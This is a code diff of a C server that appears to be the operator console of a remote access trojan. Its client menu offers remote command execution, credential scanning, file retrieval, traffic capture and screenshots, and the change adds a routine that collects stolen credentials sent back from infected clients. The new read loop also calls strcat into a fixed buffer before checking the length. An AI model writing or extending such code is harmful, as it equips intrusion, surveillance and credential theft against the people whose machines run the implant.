@@ -12,7 +12,7 @@
 
 #define PORT 8080
 
-char options[]="Choose an option:\n 1. Execute commands\n 2. Scan for credentials\n 3. Get system info\n 4. Retrieve file\n 5. Capture traffic\n 6. Monitor the system --- IN LUCRU\n ";
+char options[]="Choose an option:\n 1. Execute commands\n 2. Scan for credentials\n 3. Get system info\n 4. Retrieve file\n 5. Capture traffic\n 6. Monitor the system --- IN LUCRU\n 7.Screenshot the System --IVESCU AI DE FACUT ASTA \n 8. Return to clients menu ";
 
 typedef struct client
 {   
@@ -80,11 +80,45 @@ void exec_on_client(int clientfd)
 
 void get_credentials(int clientfd)
 {
-    char info_creds[8192*10];
+    /*char info_creds[8192*10];
     int recv_len;
     //recv_len=recvData(clientfd,info_creds);
     recv_len=recvData(clientfd,info_creds);
-    write(STDOUT_FILENO,info_creds,recv_len);
+    write(STDOUT_FILENO,info_creds,recv_len);*/
+
+    char sys_info[MAXLINE * 80] = "";
+    char buffer[MAXLINE]; 
+    int total_bytes_read = 0;
+    int bytes_read; 
+
+    sys_info[0]=0;
+
+    while ((bytes_read = read(clientfd, buffer, sizeof(buffer) - 1)) > 0) 
+    {
+        buffer[bytes_read] = '\0'; 
+        char *end_marker = strstr(buffer, "<END_OF_DATA>");
+        if (end_marker != NULL) 
+        {
+            *end_marker = '\0';
+            strcat(sys_info, buffer);
+            myWrite("Credentials from client: \n",STDOUT_FILENO);
+            myWrite(sys_info,STDOUT_FILENO);
+            break; 
+        }   
+        strcat(sys_info, buffer);
+        total_bytes_read += bytes_read;
+        if (total_bytes_read >= sizeof(sys_info) - 1) 
+        {
+            myWrite("Buffer limit reached, cannot read further data.\n",STDOUT_FILENO);
+            break;
+        }
+        }
+
+    if (total_bytes_read == 0) 
+    {
+        myWrite("Failed to receive system information from client or connection closed.\n",STDOUT_FILENO);
+    }
+
 }
 
 void get_system_info(int clientfd)
@@ -303,8 +337,10 @@ void* client_interaction_thread(void* args) {
         pthread_mutex_unlock(&client_mutex);
 
         printf("Interacting with client #%d\n", client_id);
-        printf("Options:\n");
-        printf(" 1. Execute command\n 2. Get credentials\n 3. Get system info\n 4. Retrieve file\n 5. Capture traffic\n");
+        //printf("Options:\n");
+        //printf(" 1. Execute command\n 2. Get credentials\n 3. Get system info\n 4. Retrieve file\n 5. Capture traffic\n");
+        //printf("Enter option: ");
+        printf("%s\n",options);
         printf("Enter option: ");
 
         char option;
@@ -330,6 +366,11 @@ void* client_interaction_thread(void* args) {
             case '5':
                 write(client_sock, "5", 1);
                 capturetraffic(client_sock);
+                break;
+            case '8':
+                pthread_mutex_lock(&active_client_mutex);
+                active_client=-2;
+                pthread_mutex_unlock(&active_client_mutex);
                 break;
             default:
                 printf("Invalid option!\n");
